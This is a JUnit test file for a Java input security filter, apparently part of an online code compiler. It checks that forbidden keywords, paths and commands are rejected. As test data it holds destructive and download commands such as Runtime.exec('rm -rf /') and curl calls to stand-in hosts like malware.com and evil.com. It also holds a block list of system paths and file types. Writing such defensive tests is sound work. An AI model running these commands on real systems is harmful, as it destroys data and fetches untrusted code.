package devdojo.compiler.java.security;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import devdojo.compiler.security.ISecurityFilter;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

final class JavaInputFilterTests {

  private ISecurityFilter filter;

  @BeforeEach
  void setUp() {
    filter = new JavaInputFilter();
  }

  @Test
  @DisplayName("returns false when input is null")
  void testNullInput() {
    boolean result = filter.check(null);
    assertFalse(result, "Null input be rejected");
  }

  @Test
  @DisplayName("returns false when input is empty or blank")
  void testEmptyInput() {
    boolean result = filter.check("   ");
    assertFalse(result, "Blank input be rejected");
  }

  @Test
  @DisplayName("returns true for safe Java code")
  void testValidJavaCode() {
    String safeCode = """
          public void sayHello() {
              System.out.println("Hello world!");
          }
      """;

    assertTrue(filter.check(safeCode), "Safe code pass");
  }


  @ParameterizedTest
  @ValueSource(strings = {
    "import", "../", "javax.", "java.util", "runtime.",
    "System.exit", "System.load", "while(true){}", "for(;;)"
  })
  @DisplayName("detects forbidden Java keywords")
  void testForbiddenJavaKeyword(final String keyword) {
    assertFalse(filter.check(keyword), "Forbidden Java keyword");
  }

  @ParameterizedTest
  @ValueSource(strings = {
    ".js", ".py", ".cmd", ".pdf", ".exe", ".bat", ".jpg", ".zip", ".dll",
    "/etc", "/home",
    "C:\\", "C:\\Windows\\System32", "%TMP%"
  })
  @DisplayName("detect forbidden file endings")
  void testForbiddenFileEnding(final String fileEnding) {
    assertFalse(filter.check(fileEnding), "Forbidden file endings");
  }

  @ParameterizedTest
  @ValueSource(strings = {
    "rm -rf", "\\u00FC", "../", "./", "chmod", "\\"
  })
  @DisplayName("detects forbidden commands")
  void testForbiddenCommand(final String command) {
    assertFalse(filter.check(command), "Forbidden command");
  }

  @Test
  @DisplayName("detects forbidden function code")
  void testForbiddenFunctionCode() {
    final String dangerousCode1 = """
      File f = new File("virus.exe");
      """;
    final String dangerousCode2 = """
      Process p = Runtime.getRuntime().exec("curl http://malware.com")
      """;
    final String dangerousCode3 = """
      public void evil() {
        Runtime.getRuntime().exec("rm -rf /");
      }
      """;

    assertFalse(filter.check(dangerousCode1), "Forbidden file endings");
    assertFalse(filter.check(dangerousCode2), "Forbidden Java keyword");
    assertFalse(filter.check(dangerousCode3), "Forbidden command");
  }


  @Test
  @DisplayName("detects multiple forbidden inputs")
  void testMultipleForbiddenInputs() {
    final String code = """
          Runtime.getRuntime().exec("curl evil.com");
          new File("bad.exe");
      """;

    assertFalse(filter.check(code), "Multiple forbidden items fail");
  }

}


